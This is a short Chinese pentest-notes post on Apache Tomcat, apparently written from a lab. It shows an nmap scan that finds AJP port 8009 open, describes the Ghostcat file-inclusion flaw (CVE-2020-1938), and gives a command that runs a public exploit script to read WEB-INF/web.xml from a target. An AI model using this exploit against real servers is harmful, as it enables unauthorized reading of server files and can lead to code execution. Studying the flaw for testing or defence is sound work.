---
title: Tomcat
category:
- [Kali, Exploit]
tags:
  - null
date: 2020-12-04 20:23:16
top:
updated:
---

Apache 和 Tomcat 都是web网络服务器，两者既有联系又有区别，在进行HTML、PHP、JSP、Perl等开发过程中，需要准确掌握其各自特点，选择最佳的服务器配置。  
　　Apache是web服务器（静态解析，如HTML），tomcat是java应用服务器（动态解析，如JSP）  
　　Tomcat只是一个servlet(jsp也翻译成servlet)容器，可以认为是apache的扩展，但是可以独立于apache运行


## 信息收集
```zsh
sudo nmap -sV -Pn -T4 -sSU -p 8080,8009 -sC    192.168.79.207
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-04 18:47 CST
Nmap scan report for 192.168.79.207
Host is up (0.00012s latency).

PORT     STATE  SERVICE  VERSION
8009/tcp open   ajp13    Apache Jserv (Protocol v1.3)
| ajp-methods:
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open   http     Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
8009/udp closed unknown
8080/udp closed http-alt

Nmap done: 1 IP address (1 host up) scanned in 7.62 seconds
```


## Apache Tomcat文件包含漏洞-CNVD-2020-10487/CVE-2020-1938

该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。

### 在线检测
> https://www.chaitin.cn/en/ghostcat


[Tomcat-AJP文件包含工具](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi.git)
````
./CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f WEB-INF/web.xml 10.184.67.100

````
